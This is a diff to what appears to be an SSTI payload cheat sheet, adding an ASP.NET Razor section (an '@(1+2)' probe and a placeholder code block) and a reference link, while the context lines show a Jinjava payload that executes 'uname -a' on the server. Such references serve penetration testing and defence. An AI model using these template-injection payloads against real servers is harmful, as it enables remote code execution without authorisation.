@@ -41,6 +41,9 @@
 * [Jinjava](#jinjava)
   * [Basic injection](#basic-injection)
   * [Command execution](#command-execution)
+* [ASP.NET Razor](#aspnet-razor)
+  * [Basic injection](#basic-injection)
+  * [Command execution](#command-execution)
 * [References](#references)
 
 ## Tools
@@ -418,6 +421,21 @@ Fixed by https://github.com/HubSpot/jinjava/pull/230
 {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
 ```
 
+## ASP.NET Razor
+
+### Basic injection
+
+```powershell
+@(1+2)
+```
+
+### Command execution 
+
+```csharp
+@{
+  // C# code
+}
+```
 
 ## References
 
@@ -434,3 +452,4 @@ Fixed by https://github.com/HubSpot/jinjava/pull/230
 * [Gaining Shell using Server Side Template Injection (SSTI) - David Valles - Aug 22, 2018](https://medium.com/@david.valles/gaining-shell-using-server-side-template-injection-ssti-81e29bb8e0f9)
 * [EXPLOITING SERVER SIDE TEMPLATE INJECTION WITH TPLMAP - BY: DIVINE SELORM TSA - 18 AUG 2018](https://www.owasp.org/images/7/7e/Owasp_SSTI_final.pdf)
 * [Server Side Template Injection – on the example of Pebble - MICHAŁ BENTKOWSKI | September 17, 2019](https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/)
+* [Server-Side Template Injection (SSTI) in ASP.NET Razor - Clément Notin - 15 APR 2020](https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/)
